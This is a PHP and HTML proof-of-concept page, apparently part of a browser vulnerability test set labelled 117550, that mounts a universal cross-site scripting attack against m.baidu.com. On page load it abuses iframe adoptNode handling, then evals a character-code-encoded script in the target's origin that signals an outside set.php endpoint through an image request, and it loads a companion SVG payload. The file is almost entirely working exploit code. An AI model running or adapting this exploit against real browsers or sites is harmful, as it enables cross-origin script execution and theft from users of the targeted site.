<?php
    //漏洞编号:117550
    include "config.php";
    $code = htmlspecialchars(strip_tags($_GET['code']),ENT_QUOTES);
    $setPhp = $DOMAIN."/php/set.php?code=".$code."&suc=5";
    $str = "var flag=0;suc();function suc(){if(flag){return;}if(document.domain == 'm.baidu.com'){flag=1;new Image().src='".$setPhp."';}}";
    // $str = "var flag=0;suc();function suc(){if(flag){return;}if(document.domain == 'm.baidu.com'){flag=1;new Image().src='./php/set.php?code=".$code."&suc=5';}}";

    $tmp = str_split($str);
    $result = array();

    foreach($tmp as $key => $value){
        $result[$key] = ord($value);
    }

    $input = implode(",", $result);

?>

<html>
    <head>
        <script>
            var test = function() {
                specialFrame = document.body.appendChild(document.createElement("iframe"));

                document.adoptNode(specialFrame);
                document.implementation.createHTMLDocument().adoptNode(specialFrame);

                specialFrame.contentWindow.location = "http://m.baidu.com/";

                var interval1 = setInterval(function() {
                    if (specialFrame.contentDocument)
                        return;
                    clearInterval(interval1);

                    specialFrame.src = "javascript:eval(String.fromCharCode(<?php echo $input; ?>))";
                    //specialFrame.src = "javascript:alert(document.domain)";

                    uxssFrame = document.body.appendChild(document.createElement("iframe"));
                    var domain ='<?php echo $DOMAIN; ?>';
                    uxssFrame.src = domain + "/poc/117550_1.svg";
                }, 100);
            }
        </script>
    </head>
    <body onload="test()"></body>
</html>